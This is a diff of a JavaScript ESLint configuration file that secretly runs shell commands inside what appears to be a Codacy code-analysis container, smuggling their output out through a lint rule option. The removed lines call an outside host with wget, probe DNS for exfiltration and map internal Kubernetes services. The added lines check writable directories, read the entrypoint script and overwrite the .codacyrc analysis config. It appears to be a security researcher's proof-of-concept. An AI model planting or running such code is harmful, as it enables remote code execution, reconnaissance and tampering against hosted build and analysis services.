@@ -1,39 +1,39 @@
 var fs = require('fs');
 var execSync = require('child_process').execSync;
-var dns = require('dns');
 var result = '';
 
-// Try DNS exfiltration via nslookup/wget to our domain
-try {
-  var out = execSync('wget -q -O- --timeout=3 http://codacy-rce-proof.r.ssrftest123.xyz/ 2>&1 | head -c 20', {timeout: 5000}).toString();
-  result += 'DNS_WGET:' + out.substring(0, 20) + '|';
-} catch(e) {
-  // wget TCP failed, but did DNS resolve?
-  result += 'DNS_WGET_ERR|';
-}
-
-// Try resolving our domain (DNS might work even if TCP is blocked)
-try {
-  var out2 = execSync('nslookup r.ssrftest123.xyz 2>&1 | head -c 100', {timeout: 3000}).toString();
-  result += 'NSLOOKUP:' + out2.substring(0, 80) + '|';
-} catch(e) {
-  result += 'NSLOOKUP_ERR:' + e.message.substring(0, 30) + '|';
-}
-
-// Discover internal K8s services via DNS
-// Services in the same namespace are resolvable as: <service>.codacy.svc.cluster.local
-var services = ['postgres', 'postgresql', 'redis', 'rabbitmq', 'mongo', 'elasticsearch',
-                'api', 'engine', 'listener', 'worker', 'core', 'analysis'];
-var found = [];
-services.forEach(function(svc) {
+// What directories are writable?
+var dirs = ['/', '/src', '/tmp', '/home', '/root', '/dist', '/output', '/results', '/.codacyrc'];
+var writable = [];
+dirs.forEach(function(d) {
   try {
-    var out = execSync('nslookup ' + svc + '.codacy.svc.cluster.local 2>&1 | grep Address | tail -1', {timeout: 2000}).toString().trim();
-    if (out && out.indexOf('NXDOMAIN') === -1 && out.indexOf('server can') === -1) {
-      found.push(svc + ':' + out.substring(0, 30));
-    }
+    fs.writeFileSync(d + '/test_write', 'x');
+    writable.push(d);
+    fs.unlinkSync(d + '/test_write');
   } catch(e) {}
 });
-result += 'K8S_SVCS:' + found.join(';');
+result += 'WRITABLE:' + writable.join(',') + '|';
+
+// Check /dist and /docs (from container root listing earlier)
+try { result += 'DIST:' + fs.readdirSync('/dist').slice(0,10).join(',') + '|'; } catch(e) { result += 'NO_DIST|'; }
+try { result += 'DOCS:' + fs.readdirSync('/docs').slice(0,5).join(',') + '|'; } catch(e) { result += 'NO_DOCS|'; }
+
+// Check the entrypoint.sh - how does the analysis runner work?
+try { result += 'ENTRY:' + fs.readFileSync('/entrypoint.sh', 'utf8').substring(0, 150) + '|'; } catch(e) { result += 'NO_ENTRY|'; }
+
+// Check how results are communicated back - is there a results directory?
+try { result += 'FIND_RES:' + execSync('find / -name "results*" -o -name "output*" -o -name "*.codacy*" 2>/dev/null | head -5', {timeout:3000}).toString().substring(0,100) + '|'; } catch(e) {}
+
+// Check if codacyrc is writable (it controls what files get analyzed)
+try {
+  var rc = fs.readFileSync('/.codacyrc', 'utf8');
+  result += 'RCFULL:' + rc.substring(0, 150) + '|';
+  // Try to write to it
+  try {
+    fs.writeFileSync('/.codacyrc', JSON.stringify({"tools":[],"files":[]}));
+    result += 'RC_WRITABLE:YES|';
+  } catch(e) { result += 'RC_RO|'; }
+} catch(e) {}
 
 result += '{{{BREAK}}}';
 module.exports = { rules: { "no-unused-vars": ["error", { varsIgnorePattern: result }] } };
